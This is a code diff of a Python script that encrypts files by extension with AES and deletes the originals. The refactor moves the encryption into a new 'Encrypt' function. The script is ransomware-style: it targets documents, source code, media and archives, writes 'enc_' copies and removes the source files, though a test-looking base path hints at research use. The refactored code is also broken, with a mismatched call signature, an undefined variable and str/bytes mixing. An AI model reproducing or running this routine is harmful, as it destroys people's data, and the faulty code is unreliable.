@@ -14,6 +14,20 @@ encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
 base_path = "/TestFiles/Text/1500KB"
 
+def Encrypt(fileToEncrypt, iv, aes_obj):
+    encrypted = ""
+    with open(fileToEncrypt, 'rb') as infile:
+        encrypted = encrypted + file_size.encode('utf-8')
+        encrypted = encrypted + iv
+        while True:
+            chunk = infile.read(64 * 1024)
+            if len(chunk) == 0:
+                break
+            elif len(chunk) % 16 != 0:
+                chunk += b' ' * (16 - (len(chunk) % 16))
+            encrypted = encrypted + aes_obj.encrypt(chunk)
+    return encrypted
+
 def GetInitializationVector():
     # iv = Crypto.Random.OSRNG.posix.new().read(AES.block_size)
     # iv = Crypto.Random.new().read(16)
@@ -27,18 +41,11 @@ def EncryptFile(fileToEncrypt, key):
     iv = GetInitializationVector()
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
 
-    with open(fileToEncrypt, 'rb') as infile:
-        with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
-            outfile.write(file_size.encode('utf-8'))
-            outfile.write(iv)
-            while True:
-                chunk = infile.read(64 * 1024)
-                if len(chunk) == 0:
-                    break
-                elif len(chunk) % 16 != 0:
-                    chunk += b' ' * (16 - (len(chunk) % 16))
+    encrypted_content = Encrypt(fileToEncrypt, key, iv, aes_obj)
 
-                outfile.write(aes_obj.encrypt(chunk))
+    with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
+        outfile.write(encrypted_content)
+
     os.remove(fileToEncrypt)
 
 def EncryptAllFiles(filesToEncrypt, key):
